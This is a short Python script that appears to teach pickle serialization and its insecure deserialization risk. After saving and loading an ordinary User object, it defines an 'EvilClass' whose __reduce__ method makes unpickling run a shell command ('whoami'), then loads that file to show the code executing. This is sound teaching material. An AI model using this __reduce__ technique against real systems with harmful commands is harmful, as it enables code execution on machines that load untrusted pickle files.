"""
Demo Pickle Functionality
"""

import pickle
#import os

class User:
    def __init__(self, name, email, data=None):
        """
        Create a User
        """
        self.name = name
        self.email = email
        self.data = data

    def __str__(self):
        """Print the User"""
        return "User: {0} {1} {2}".format(self.name,
                                          self.email,
                                          self.data)


def saveObject(theFile, theObject):
    """
    'Helper' Function to save an object to a file
    """

    with open(theFile,'wb') as fd:
        pickle.dump(theObject, fd)

        


def loadObject(theFile):
    """
    'Helper' Function to create an object to a file
    """

    with open(theFile,"rb") as fd:
        out = pickle.load(fd)
    return out


#An Evil Class to Pickle
class EvilClass:
    def __reduce__(self):
        import os
        return os.system, ('whoami',)

    
if __name__ == "__main__":
    theUser = User("dang", "dang@evil.org")

    out = pickle.dumps(theUser)
    #print (out) #Uncomment this if you are interested

    #Reload the object using the string we just created
    newUser = pickle.loads(out)

    print(newUser)
    
    #And Demo the Loading / Saving
    saveObject("user.pkl", theUser)

    out = loadObject("user.pkl")
    print(out)


    #And Demonstrate our evil class

    payload = EvilClass()
    saveObject("evil.pkl", payload)
    
    #Now load the evil class
    print ("Loading our Evil Class")
    out = loadObject("evil.pkl")
    #print(out)
